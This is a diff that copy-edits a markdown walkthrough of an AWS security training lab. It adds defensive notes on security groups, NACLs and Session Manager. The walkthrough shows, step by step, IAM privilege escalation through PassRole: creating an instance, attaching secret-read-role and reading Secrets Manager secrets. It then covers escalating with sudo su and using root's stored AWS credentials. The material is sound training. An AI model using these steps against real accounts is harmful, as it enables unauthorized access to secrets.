@@ -3,51 +3,51 @@ Today we will follow the tracks of a reckless engineer to read his darkest secre
 
 ## Getting through the doors
 Once you open your terminal, you can see the workdir directory with the `target-instance.txt` file where you can see a user and ip address of the server you need to log into. We will let you "guess" the password.
-Assuming that you logged in succesfully we are going to stop and look at what we could do better on the account to prevent access to the server.
-### Security group
-We are going to start with Security groups which are attached to the instance. Allowing all traffic from any source is a dangerous practice and you should limit entries to the trusted sources and the ports actually used by the application/service.
+Assuming that you logged in successfully, we are going to stop and look at what we could do better on the account to prevent access to the server.
+### Security Group
+We are starting with Security groups which are attached to the instance. Allowing all traffic from any source is a dangerous practice and you should limit entries to the trusted sources and the ports actually used by the application/service.
 
 <p align="center">
   <img src="./images/sg.png" />
 </p>
 
-Security groups are stateful therfore allowing incoming traffic allows the response.
+Security groups are stateful, therefore allowing incoming traffic allows the response.
 
 See more in the documentation: https://docs.aws.amazon.com/vpc/latest/userguide/security-groups.html
 
 ### NACL
-Network Access Control Lists allow you to manage traffic withing your VPC (applied to subnets), they are evaluated before Security groups and are stateless (You need to allow response traffic separately).
+Network Access Control Lists allow you to manage traffic within your VPC (applied to subnets), they are evaluated before Security groups and are stateless (You need to allow response traffic separately).
 
 See more in the documentation: https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html
 
 ### Systems Manager
-Lastly - it is worth to ask ourselves the question if allowing to access the instance via ssh is absolutely necessary. AWS allows you to use session manager for a console access to the server and use IAM to control the accesss to the instances.
+Lastly - it is worth asking ourselves the question if allowing to access the instance via ssh is absolutely necessary. AWS allows you to use a session manager for console access to the server and use IAM to control the access to the instances.
 
 See more in the documentation https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html
 
-## IAM privilige escalation
-### Discover availible credentials 
-Once we logged in onto the ec2 instance we can discover if any IAM, API credenials are availible. Lets execute:
+## IAM privilege escalation
+### Discover available credentials 
+Once we are logged in to the ec2 instance we can discover if any IAM and API credentials are available. Let's execute:
 ```
 aws sts get-caller-identity
 ```
-Your output should look like below:
+Your output should look like the following:
 <p align="center">
   <img src="./images/get-caller-identity.png" />
 </p>
-We can see that the instance assumed role dpg-funny-panda-workstation. Lets see what permissions are attached to this role. We can do this by executing:
+We can see that the instance assumed role dpg-funny-panda-workstation. Let's see what permissions are attached to this role. We can do this by executing:
 
 ```bash
 aws iam list-attached-role-policies --role-name dpg-funny-panda-workstation
 ```
-Your output should look like below: 
+Your output should look like this: 
 
 <p align="center">
   <img src="./images/list-policies.png" />
 </p>
 
-We can see one IAM policy attached to the role, lets investigate what permissions are defined in the policy.
-Firs we need to look into the the policy:
+We can see one IAM policy attached to the role, let's investigate what permissions are defined in the policy.
+First, we need to look into the policy:
 ```
 aws iam get-policy --policy-arn arn:aws:iam::204521158369:policy/dpg-funny-panda-workstation
 ```
@@ -68,7 +68,7 @@ You should see the full IAM policy and your output should start with below:
   <img src="./images/instance-policy.png" />
 </p>
 
-The above policy allows us ec2 actions as as to pass secret-read-role. Lets investigate what policies this role has and what permissions are defined for this role. Lets execute three commands below
+The above policy allows us ec2 actions as as to pass secret-read-role. To investigate what policies this role has and what permissions are defined for this role, let's execute the three commands below
 ```
 aws iam list-attached-role-policies --role-name secret-read-role
 aws iam get-policy --policy-arn arn:aws:iam::204521158369:policy/get-playground-secret
@@ -80,16 +80,16 @@ Your last output should look like
 </p>
 
 
-We can see that the policy allows us to read one of the secrets on the account. To do so we can create a new EC2 instance and attach secret-read-role to the instance profile and once we connect to the new server read the secret. 
+We can see that the policy allows us to read one of the secrets on the account. To do so we can create a new EC2 instance and attach a secret-read-role to the instance profile. Once connected to the new server we can read the secret. 
 
-First, lets create a new key-pair:
+First, let's create a new key-pair:
 ```
 aws ec2 create-key-pair \       
    --key-name funny-panda \
    --query 'KeyMaterial' --output text > ~/.ssh/funny-panda
 ```
 
-Now lets find out more about our current instance to deploy our new server in the same network. We can find our instance ID by executing:
+Now it's time to find out more about our current instance and to deploy our new server in the same network. We can find our instance ID by executing:
 ```
 aws sts get-caller-identity
 ```
@@ -103,7 +103,7 @@ Your output should be a JSON file with the instance configuration like below.
   <img src="./images/ec2.png" />
 </p>
 
-Note the the AMI ID, Security group id, and subnet ids, next lets create a new EC2 instance with the command below:
+Note the AMI ID, Security group id, and subnet ids. As next step, let's create a new EC2 instance with the command below:
 ```bash
 aws ec2 run-instances \
     --image-id ami-00caa7df15d2e771f \
@@ -115,7 +115,7 @@ aws ec2 run-instances \
     --block-device-mappings "[{\"DeviceName\":\"/dev/sdf\",\"Ebs\":{\"VolumeSize\":30,\"DeleteOnTermination\":false}}]" \
     --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=funny-panda}]' 'ResourceType=volume,Tags=[{Key=Name,Value=funny-panda-disk}]'
 ```
-Once your new instance is created - note its IP address. Next lets create an instance profile.
+Once your new instance is created - note its IP address. Next, let's create an instance profile.
 ```bash
 aws iam create-instance-profile \
  --instance-profile-name funnypanda
@@ -126,11 +126,11 @@ aws iam add-role-to-instance-profile \
 --instance-profile-name funnypanda \
 --role-name secret-read-role
 ```
-And finally associate the profile with our instance:
+And finally, associate the profile with our instance:
 ```bash
 aws ec2 associate-iam-instance-profile --iam-instance-profile Name=funnypanda --instance-id i-0516aa13e97073823
 ```
-Now our new server is ready to be used. Lets modify the permissions of our key before we use it to ssh to the server
+Now our new server is ready to be used. Let's modify the permissions of our key before we use it to ssh to the server:
 ```
 chmod 400 ~/.ssh/funny-panda
 ```
@@ -144,26 +144,26 @@ aws secretsmanager get-secret-value --secret-id playground-secret
 ```
 
 ## OS privilage escalation + API keys
-So we managed to read one of the secrets, but there is still one more around the corner. Lets get back to our target instance and see if our user is added to the sudoers list.
+So we managed to read one of the secrets, but there is still one more around the corner. Let's get back to our target instance and see if our user is added to the sudoers list.
 ```bash
 sudo su
 ```
-Now once we are a root user lets try:
+Now once we are a root user let's try:
 ```
 aws sts get-caller-identity
 ```
-You should notice that this time we assumed a different AWS entity, AWS user, like below
+You should notice that this time we assumed a different AWS entity, AWS user, like below:
 
 <p align="center">
   <img src="./images/root.png" />
 </p>
 
-It looks like there are locally stored credentials for the root user which take precedence over attached role. We can confirm that by trying
+It looks like there are locally stored credentials for the root user which take precedence over the attached role. We can confirm that by trying
 
 ```bash
 env | grep AWS
 ```
-Now lets see what permissions we have attached to this user.
+Now let's see what permissions we have attached to this user.
 
 ```bash
 aws iam list-attached-user-policies --user-name dpg-sweet-panda
@@ -172,7 +172,7 @@ Looks like there are no policies attached:
 <p align="center">
   <img src="./images/user-policies.png" />
 </p>
-Lets see if user has any inline policy then.
+Let's see if the user has any inline policy then.
 
 ```bash
 aws iam list-user-policies --user-name dpg-sweet-panda
@@ -189,7 +189,7 @@ You should notice a familiar statement in the policy
 <p align="center">
   <img src="./images/user-secret.png" />
 </p>
-Lastly lets reveal the last part be executing:
+Lastly, let's reveal the last part be executing:
 
 ```bash
 aws secretsmanager get-secret-value --secret-id User_secret
